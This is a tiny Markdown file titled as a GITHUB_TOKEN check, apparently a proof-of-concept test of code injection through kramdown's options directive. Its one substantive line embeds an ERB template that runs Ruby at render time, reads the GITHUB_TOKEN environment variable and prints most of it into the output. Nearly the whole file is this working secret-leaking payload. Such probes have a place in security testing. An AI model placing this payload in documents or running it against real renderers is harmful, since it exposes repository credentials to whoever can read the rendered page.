---
---

# Test 2: GITHUB_TOKEN check

{::options template="string://<%= t = ENV.fetch('GITHUB_TOKEN','NONE'); 'GH_TOKEN=' + t[0..30].to_s %>" /}

placeholder
